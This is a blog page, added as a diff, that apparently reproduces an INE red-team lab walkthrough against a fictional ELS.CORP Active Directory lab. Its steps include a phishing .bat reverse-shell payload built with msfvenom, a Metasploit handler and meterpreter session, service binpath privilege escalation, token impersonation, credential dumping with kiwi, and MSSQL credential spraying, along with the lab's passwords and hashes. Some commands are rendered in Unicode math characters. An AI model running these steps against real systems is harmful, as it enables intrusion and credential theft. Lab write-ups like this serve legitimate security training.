@@ -1,0 +1,654 @@
+
+
+  <!DOCTYPE html>
+  <html lang="en" data-default-color-scheme=&#34;dark&#34; >
+  <style>
+    .text1
+    {
+    text-shadow: 0px 0px 2px #f2f3f2;
+    }
+    </style>
+
+  
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/null">
+  <link rel="icon" type="image/png" href="/null">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>攻击链六：域渗透案例三 - whale3070&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+    <body>
+      <header style="height: 70vh;">
+        <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>InfoSec learning</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+          <div class="banner" id="banner" false
+            style="background: url('/img/default.png') no-repeat center center;
+              background-size: cover;">
+              <div class="full-bg-img">
+                <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+                  <div class="page-header text-center fade-in-up">
+                    <span class="h2 text1" id="subtitle" title="攻击链六：域渗透案例三">
+                      
+                        攻击链六：域渗透案例三
+                      
+                    </span>
+        
+                    
+                      <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-06-22 14:11" pubdate>
+        June 22, 2021 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.8k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      76
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+                    
+                  </div>
+                    
+                  </div>
+                  
+                </div>
+              </div>
+          </div>
+      </header>
+
+      <main>
+        
+          
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">攻击链六：域渗透案例三</h1>
+            
+            <div class="markdown-body">
+              <h1 id="Red-teaming-Active-Directory-Lab-3-ELS-CORP-Attack-Path-1"><a href="#Red-teaming-Active-Directory-Lab-3-ELS-CORP-Attack-Path-1" class="headerlink" title="Red-teaming Active Directory Lab #3 (ELS.CORP) (Attack Path 1)"></a>Red-teaming Active Directory Lab #3 (ELS.CORP) (Attack Path 1)</h1><p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image2.png" srcset="/img/loading.gif"></p>
+<h2 id="Contents"><a href="#Contents" class="headerlink" title="Contents"></a>Contents</h2><h3 id="Mail-Server-Attack-Path-Path-1"><a href="#Mail-Server-Attack-Path-Path-1" class="headerlink" title="Mail Server Attack Path (Path 1)"></a>Mail Server Attack Path (Path 1)</h3><ol>
+<li><p> DEV SYS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
+</li>
+<li><p> DB-SRV . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
+</li>
+<li><p> ELS-DC . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
+</li>
+<li><p> MGMT-DC . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
+</li>
+<li><p> JUMP-SRV . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
+</li>
+<li><p> Admin-SYS . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
+</li>
+</ol>
+<h2 id="Scenario"><a href="#Scenario" class="headerlink" title="Scenario"></a>Scenario</h2><p>You have been asked to execute a (black-box) red teaming exercise against eLS Corp (including any related/trusted forest). The letter of engagement has specified:</p>
+<ol>
+<li><p> The ADMIN-SYS system as the crown jewel. This means that the ultimate goal of this red teaming exercise is to obtain access to the ADMIN-SYS system.</p>
+</li>
+<li><p> That during this exercise, the web application hosted on 172.16.250.2 is out of scope and should not be touched</p>
+</li>
+<li><p> The mail server hosted on 172.16.250.2 is included in the scope and you can execute phishing attempts. Note that the only file type you can attach is .bat files.</p>
+</li>
+<li><p> That the pentesters’ network range is 172.16.25.0/24 and a static route has been configured so that pentesters can access the 172.16.250.0/24 network range, where eLS Corp assets exist</p>
+</li>
+<li><p> For any cracking activities use the <em>/usr/share/wordlists/rockyou.txt</em> wordlist, included in latest Kali’s</p>
+</li>
+</ol>
+<h2 id="Hints"><a href="#Hints" class="headerlink" title="Hints"></a>Hints</h2><p>Refer to the attack path diagram of page 1 only when you are out of options.</p>
+<h4 id="1-DEV-SYS-Server"><a href="#1-DEV-SYS-Server" class="headerlink" title="1. DEV-SYS Server"></a>1. DEV-SYS Server</h4><p>Scanning the accessible IP range from the scope of engagement provides us with two possible entry points both residing on the “<strong>172.16.250.2</strong>“ IP. Specifically, scanning the TCP ports of <strong>172.16.250.2</strong> tells us that an SMTP server and a web application are running on TCP ports 25 and 80. According to the letter of engagement, the web application is out of scope.</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/3890101f-20b6-46a3-9301-5bd3f33601ac/image3.png" srcset="/img/loading.gif"></p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/3890101f-20b6-46a3-9301-5bd3f33601ac/image4.png" srcset="/img/loading.gif"></p>
+<p>Let’s perform banner grabbing against the SMTP service running on the target server. A username “<strong><a href="mailto:dev-user@els.corp">dev-user@els.corp</a>“</strong> is visible which means the mailbox belongs to this particular user.</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/3890101f-20b6-46a3-9301-5bd3f33601ac/image5.png" srcset="/img/loading.gif"></p>
+<p>Since there is no other entry point, we need to send a malicious attachment along with an e-mail to “<strong>dev-user</strong>“ and wait until the attachment is opened.</p>
+<p>We will use msfvenom to generate a malicious batch file, that will be sent as an attachment to the victim machine.</p>
+<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">𝑚𝑠𝑓𝑣𝑒𝑛𝑜𝑚 −𝑝 𝑐𝑚𝑑<span class="hljs-regexp">/𝑤𝑖𝑛𝑑𝑜𝑤𝑠/</span>𝑟𝑒𝑣𝑒𝑟𝑠𝑒_𝑝𝑜𝑤𝑒𝑟𝑠ℎ𝑒𝑙𝑙 𝐿𝐻𝑂𝑆𝑇=<span class="hljs-number">172.16</span>.<span class="hljs-number">25</span>.𝑥 𝐿𝑃𝑂𝑅𝑇=<span class="hljs-number">4443</span> &gt; 𝑎𝑡𝑡𝑎𝑐ℎ.𝑏𝑎𝑡<br></code></pre></div></td></tr></table></figure>
+
+<p>Let’s now setup our listener using Metasploit, using the above TCP port and IP address.</p>
+<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">𝑚𝑠𝑓𝑐𝑜𝑛𝑠𝑜𝑙𝑒<br>𝑢𝑠𝑒 𝑒𝑥𝑝𝑙𝑜𝑖𝑡<span class="hljs-regexp">/𝑚𝑢𝑙𝑡𝑖/</span>ℎ𝑎𝑛𝑑𝑙𝑒𝑟<br>𝑠𝑒𝑡 𝑝𝑎𝑦𝑙𝑜𝑎𝑑 𝑐𝑚𝑑<span class="hljs-regexp">/𝑤𝑖𝑛𝑑𝑜𝑤𝑠/</span>𝑟𝑒𝑣𝑒𝑟𝑠𝑒_𝑝𝑜𝑤𝑒𝑟𝑠ℎ𝑒𝑙𝑙<br>𝑠𝑒𝑡 𝐿𝐻𝑂𝑆𝑇 &lt;𝑦𝑜𝑢𝑟_𝐼𝑃_𝐴𝑑𝑑𝑟𝑒𝑠𝑠&gt;<br>𝑠𝑒𝑡 𝐿𝑃𝑂𝑅𝑇 &lt;𝐿𝑖𝑠𝑡𝑒𝑛𝑖𝑛𝑔_𝑃𝑜𝑟𝑡&gt;<br>𝑟𝑢𝑛<br></code></pre></div></td></tr></table></figure>
+
+<p>For sending the e-mail to our target [“dev-user.els.corp”] we will use the “<strong>sendemail”</strong> tool, as follows.</p>
+<figure class="highlight 1c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs 1c">𝑐𝑎𝑡 𝑚𝑠𝑔.𝑡𝑥𝑡 <span class="hljs-string">| 𝑠𝑒𝑛𝑑𝑒𝑚𝑎𝑖𝑙 −𝑙 𝑒𝑚𝑎𝑖𝑙.𝑙𝑜𝑔 −𝑓 &quot;</span>𝑠𝑒𝑛𝑑𝑒𝑟@𝑡𝑒𝑠𝑡.𝑐𝑜𝑚<span class="hljs-string">&quot; −𝑢 &quot;</span>𝑠𝑢𝑏𝑗𝑒𝑐𝑡<span class="hljs-string">&quot; −𝑡 &quot;</span>𝑑𝑒𝑣−𝑢𝑠𝑒𝑟@𝑒𝑙𝑠.𝑐𝑜𝑟𝑝<span class="hljs-string">&quot; −𝑠 &quot;</span><span class="hljs-number">172.16</span>.<span class="hljs-number">250.2</span>:<span class="hljs-number">25</span><span class="hljs-string">&quot; −𝑜 𝑡𝑙𝑠=𝑛𝑜 −𝑎 𝑎𝑡𝑡𝑎𝑐ℎ.𝑏𝑎𝑡</span><br></code></pre></div></td></tr></table></figure>
+
+<p><strong>Switches:</strong></p>
+<p><strong>-f:</strong> Sender of mail</p>
+<p><strong>-u:</strong> Subject added in the mail</p>
+<p><strong>-t:</strong> Target user (or recipient)</p>
+<p><strong>-s:</strong> Server to connect while sending mail</p>
+<p><strong>-a:</strong> Attachment to send with Mail.</p>
+<p>The e-mail should have been sent successfully, when the following message appears:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/3890101f-20b6-46a3-9301-5bd3f33601ac/image6.png" srcset="/img/loading.gif"></p>
+<p>As soon as our attachment is opened by the target user [“dev-user.els.corp”], we will have our initial foothold in the target user machine. <strong>If the session is not established, please execute the below from inside your attacking machine (Impacket is required) and then send the email again a couple of times.</strong></p>
+<p><code>python3 smbexec.py &#39;Administrator:Doctor@963&#39;@172.16.250.5</code></p>
+<p>Inside the semi-interactive shell execute:</p>
+<p><code>netsh interface ipv4 set interface Ethernet0 metric=20</code></p>
+<p>Inside the semi-interactive shell also execute:</p>
+<p><code>netsh interface ipv4 set interface Ethernet1 metric=10</code></p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/3890101f-20b6-46a3-9301-5bd3f33601ac/image7.png" srcset="/img/loading.gif"></p>
+<p>This session can then be converted into a stable meterpreter session, as follows:</p>
+<figure class="highlight haxe"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs haxe">𝑢𝑠𝑒 𝑝𝑜𝑠𝑡/𝑚𝑢𝑙𝑡𝑖/𝑚𝑎𝑛𝑎𝑔𝑒/𝑠ℎ𝑒𝑙𝑙<span class="hljs-literal">_</span>𝑡𝑜<span class="hljs-literal">_</span>𝑚𝑒𝑡𝑒𝑟𝑝𝑟𝑒𝑡𝑒𝑟<br>𝑠𝑒𝑡 𝑝𝑎𝑦𝑙𝑜𝑎𝑑<span class="hljs-literal">_</span>𝑜𝑣𝑒𝑟𝑟𝑖𝑑𝑒 𝑤𝑖𝑛𝑑𝑜𝑤𝑠/𝑚𝑒𝑡𝑒𝑟𝑝𝑟𝑒𝑡𝑒𝑟/𝑟𝑒𝑣𝑒𝑟𝑠𝑒<span class="hljs-literal">_</span>𝑡𝑐𝑝<br>𝑠𝑒𝑡 𝑠𝑒𝑠𝑠𝑖𝑜𝑛 &lt;𝑠𝑒𝑠𝑠𝑖𝑜𝑛<span class="hljs-literal">_</span>𝐼𝐷&gt;<br>𝑠𝑒𝑡 𝐿𝐻𝑂𝑆𝑇 <span class="hljs-number">172.16</span><span class="hljs-number">.25</span>.𝑥<br>𝑠𝑒𝑡 𝐿𝑃𝑂𝑅𝑇 &lt;𝑙𝑖𝑠𝑡𝑒𝑛𝑖𝑛𝑔<span class="hljs-literal">_</span>𝑝𝑜𝑟𝑡&gt;<br>run<br><br>or<br><br>𝑠𝑒𝑠𝑠𝑖𝑜𝑛𝑠 −𝑢 &lt;𝑠𝑒𝑠𝑠𝑖𝑜𝑛<span class="hljs-literal">_</span>𝐼𝐷&gt;<br></code></pre></div></td></tr></table></figure>
+
+<p>We now have a stable Meterpreter session with “<strong>dev-user</strong>“ domain user rights. We now need to enumerate the environment &amp; elevate our privileges in order to move forward in the network.</p>
+<p>After enumerating the services, we as “<strong>dev-user</strong>“ have FULL CONTROL over the SNMPTRAP service.</p>
+<figure class="highlight cmd"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmd"><span class="hljs-function">C:\<span class="hljs-title">Windows</span>&gt;<span class="hljs-title">sc</span> <span class="hljs-title">qc</span> <span class="hljs-title">snmptrap</span></span><br><span class="hljs-function"><span class="hljs-title">sc</span> <span class="hljs-title">qc</span> <span class="hljs-title">snmptrap</span></span><br><span class="hljs-function">[<span class="hljs-title">SC</span>] <span class="hljs-title">QueryServiceConfig</span> <span class="hljs-title">SUCCESS</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">SERVICE_NAME</span>: <span class="hljs-title">snmptrap</span></span><br><span class="hljs-function">        <span class="hljs-title">TYPE</span>               : 10  <span class="hljs-title">WIN32_OWN_PROCESS</span> </span><br><span class="hljs-function">        <span class="hljs-title">START_TYPE</span>         : 2   <span class="hljs-title">AUTO_START</span></span><br><span class="hljs-function">        <span class="hljs-title">ERROR_CONTROL</span>      : 1   <span class="hljs-title">NORMAL</span></span><br><span class="hljs-function">        <span class="hljs-title">BINARY_PATH_NAME</span>   : <span class="hljs-title">C</span>:\<span class="hljs-title">Windows</span>\<span class="hljs-title">System32</span>\<span class="hljs-title">snmptrap.exe</span></span><br><span class="hljs-function">        <span class="hljs-title">LOAD_ORDER_GROUP</span>   : </span><br><span class="hljs-function">        <span class="hljs-title">TAG</span>                : 0</span><br><span class="hljs-function">        <span class="hljs-title">DISPLAY_NAME</span>       : <span class="hljs-title">SNMP</span> <span class="hljs-title">Trap</span></span><br><span class="hljs-function">        <span class="hljs-title">DEPENDENCIES</span>       : </span><br><span class="hljs-function">        <span class="hljs-title">SERVICE_START_NAME</span> : .\<span class="hljs-title">Administrator</span></span><br></code></pre></div></td></tr></table></figure>
+
+<p>Since we have full control over this service, to elevate our privileges to local administrator we can add dev-user to the “<strong>Administrators</strong>“ group by abusing the binary path of the service.</p>
+<figure class="highlight cmd"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmd">sc stop snmptrap<br>sc config snmptrap binpath=&quot;<span class="hljs-built_in">net</span> localgroup administrators dev-user /add&quot;<br>sc <span class="hljs-built_in">start</span> snmptrap<br></code></pre></div></td></tr></table></figure>
+
+<p>Exit the shell and spawn a new shell from the meterpreter prompt. We can see that “<strong>Dev-User</strong>“ can now be found as a member of the local Administrators group.</p>
+<figure class="highlight cmd"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmd"><span class="hljs-function">C:\<span class="hljs-title">Windows</span>\<span class="hljs-title">system32</span>&gt;<span class="hljs-title">net</span> <span class="hljs-title">localgroup</span> <span class="hljs-title">Administrators</span></span><br><span class="hljs-function"><span class="hljs-title">net</span> <span class="hljs-title">localgroup</span> <span class="hljs-title">Administrators</span></span><br><span class="hljs-function"><span class="hljs-title">Alias</span> <span class="hljs-title">name</span>     <span class="hljs-title">Administrators</span></span><br><span class="hljs-function"><span class="hljs-title">Comment</span>        <span class="hljs-title">Administrators</span> <span class="hljs-title">have</span> <span class="hljs-title">complete</span> <span class="hljs-title">and</span> <span class="hljs-title">unrestricted</span> <span class="hljs-title">access</span> <span class="hljs-title">to</span> <span class="hljs-title">the</span> <span class="hljs-title">computer</span>/<span class="hljs-title">domain</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">Members</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">-------------------------------------------------------------------------------</span><br><span class="hljs-function"><span class="hljs-title">Administrator</span></span><br><span class="hljs-function"><span class="hljs-title">ELS</span>-<span class="hljs-title">CHILD</span>\<span class="hljs-title">dev</span>-<span class="hljs-title">user</span></span><br><span class="hljs-function"><span class="hljs-title">ELS</span>-<span class="hljs-title">CHILD</span>\<span class="hljs-title">Domain</span> <span class="hljs-title">Admins</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">The</span> <span class="hljs-title">command</span> <span class="hljs-title">completed</span> <span class="hljs-title">successfully</span>.</span><br></code></pre></div></td></tr></table></figure>
+
+<p>A Database Connection configuration file is located at the Administrator’s Desktop, but as a local administrator member we still do not have enough privileges to view it.</p>
+<p>To view the file, we can impersonate the token of Administrator at DEV-SYS, as follows.</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">load incognito<br>list_tokens -u<br><br>Delegation Tokens Available<br>========================================<br>DEV-SYS\Administrator<br>ELS-CHILD\dev-admin<br>ELS-CHILD\dev-user<br>Font Driver Host\UMFD-0<br>Font Driver Host\UMFD-1<br>NT AUTHORITY\LOCAL SERVICE<br>NT AUTHORITY\NETWORK SERVICE<br>NT AUTHORITY\SYSTEM<br>Window Manager\DWM-1<br><br>Impersonation Tokens Available<br>========================================<br>No tokens available<br><br>impersonate token <span class="hljs-string">&quot;DEV-SYS\Administrator&quot;</span><br></code></pre></div></td></tr></table></figure>
+
+<p>Now, as DEV-SYS\Administrator we can view the file located at the Administrator’s Desktop. An IP address of a Database server is clearly visible in the file.</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/3890101f-20b6-46a3-9301-5bd3f33601ac/image8.png" srcset="/img/loading.gif"></p>
+<p>As part of our post-exploitation activities, we will dump the credentials in this machine to maintain stable persistence.</p>
+<p>But first, let us migrate to x64 process &amp; load the kiwi module to dump credentials.</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">migrate <span class="hljs-variable">$x64_pid</span><br>load kiwi<br>creds_all<br><br>[. . 𝑆𝑁𝐼𝑃. .]<br>𝑚𝑠𝑣 ∶<br>[00000003] 𝑃𝑟𝑖𝑚𝑎𝑟𝑦<br>∗ 𝑈𝑠𝑒𝑟𝑛𝑎𝑚𝑒 ∶ 𝑑𝑒𝑣−𝑎𝑑𝑚𝑖𝑛<br>∗ 𝐷𝑜𝑚𝑎𝑖𝑛 ∶ 𝐸𝐿𝑆−𝐶𝐻𝐼𝐿𝐷<br>∗ 𝑁𝑇𝐿𝑀 ∶ 𝟕𝒃𝟓𝟑𝒄𝟔𝟎𝒆𝟗𝟏𝟏𝟑𝒄𝒄𝟖𝒃𝟏𝟗𝟒𝒄𝒃𝟑𝟒𝒅𝒆𝟒𝟖𝟎𝟓𝒇𝟑𝒃<br>∗ 𝑆𝐻𝐴1 ∶ 72𝑓𝑑2𝑐3𝑑682𝑑3957𝑓𝑑6𝑏8523𝑑𝑑86𝑐𝑐12𝑏𝑎51𝑎𝑒𝑓2<br>∗ 𝐷𝑃𝐴𝑃𝐼 ∶ 𝑓5𝑐𝑓𝑑88𝑑690𝑒1𝑒9338𝑒2𝑒𝑑8162𝑎6𝑏6𝑏4<br>𝑡𝑠𝑝𝑘𝑔 ∶<br>𝑤𝑑𝑖𝑔𝑒𝑠𝑡 ∶<br>∗ 𝑈𝑠𝑒𝑟𝑛𝑎𝑚𝑒 ∶ 𝑑𝑒𝑣−𝑎𝑑𝑚𝑖𝑛<br>∗ 𝐷𝑜𝑚𝑎𝑖𝑛 ∶ 𝐸𝐿𝑆−𝐶𝐻𝐼𝐿𝐷<br>∗ 𝑃𝑎𝑠𝑠𝑤𝑜𝑟𝑑 ∶ 𝑯@𝒓𝒅𝑷@𝒔𝒔𝑫!𝒇𝒇!𝒄𝒖𝒍𝒕𝟗𝟔𝟒!!<br>𝑘𝑒𝑟𝑏𝑒𝑟𝑜𝑠 ∶<br>∗ 𝑈𝑠𝑒𝑟𝑛𝑎𝑚𝑒 ∶ 𝑑𝑒𝑣−𝑎𝑑𝑚𝑖𝑛<br>∗ 𝐷𝑜𝑚𝑎𝑖𝑛 ∶ 𝐸𝐿𝑆−𝐶𝐻𝐼𝐿𝐷.𝐸𝐿𝑆.𝐶𝑂𝑅𝑃<br>∗ 𝑃𝑎𝑠𝑠𝑤𝑜𝑟𝑑 ∶ (𝑛𝑢𝑙𝑙)<br>𝑠𝑠𝑝 ∶<br>𝑐𝑟𝑒𝑑𝑚𝑎𝑛 ∶<br>[. . 𝑆𝑁𝐼𝑃. .]<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>Dev-Admin</strong>‘ (domain user) credentials have been discovered. Now, let’s add a route to 10.10.1.0/24 network discovered in the configuration file.</p>
+<p><code>route add 10.10.1.0/24 &lt;session_id&gt;</code></p>
+<h4 id="2-DB-SRV-Server"><a href="#2-DB-SRV-Server" class="headerlink" title="2. DB-SRV Server"></a><strong>2.</strong> <strong>DB-SRV Server</strong></h4><p>By performing ping sweep on the machines in the 10.10.1.0/24 network, the following hosts were found live.</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">use post/multi/gather/ping_sweep<br><span class="hljs-built_in">set</span> rhosts 10.10.1.0/24<br><span class="hljs-built_in">set</span> session &lt;session_id&gt;<br>run<br><br>[..SNIP..]<br>[+] 10.10.1.1 host found<br>[+] 10.10.1.2 host found<br>[+] 10.10.1.3 host found<br>[..SNIP..]<br></code></pre></div></td></tr></table></figure>
+
+<p>Scanning for open TCP ports on the <strong>10.10.1.2</strong> machine that we discovered, shows that TCP port 1433 is actually open.</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/3890101f-20b6-46a3-9301-5bd3f33601ac/image9.png" srcset="/img/loading.gif"></p>
+<p>The discovered “<strong>dev-admin</strong>“ credentials can be sprayed on the target network. Metasploit’s “<strong>scanner/mssql/mssql_login</strong>“ can also be used to check if a SQL instance is running at the specified machine with credentials.</p>
+<p>The following text box shows how to use “<strong>dev-admin</strong>“ credentials with the abovementioned Metasploit module to check whether we have access to any MS SQL instances on the machines we discovered on the internal network.</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">use auxiliary/scanner/mssql/mssql_login<br><span class="hljs-built_in">set</span> username dev-admin<br><span class="hljs-built_in">set</span> password H@rdP@ssD!ff!cult964!!<br><span class="hljs-built_in">set</span> rhosts 10.10.1.2<br></code></pre></div></td></tr></table></figure>
+
+<p>It seems that dev-admin can login to the DB-SRV [10.10.1.2] machine.</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/3890101f-20b6-46a3-9301-5bd3f33601ac/image10.png" srcset="/img/loading.gif"></p>
+<p>Trying to enable “<strong>xp_cmdshell”</strong> to maintain a persistent shell on the DB-SRV machine has failed because the user has insufficient rights to do so.</p>
+<p>After enumeration, it was found that there is a SQL impersonation vulnerability on the DB-SRV machine through which the “<strong>dev-admin</strong>“ user can impersonate the “<strong>sa</strong>“ user.</p>
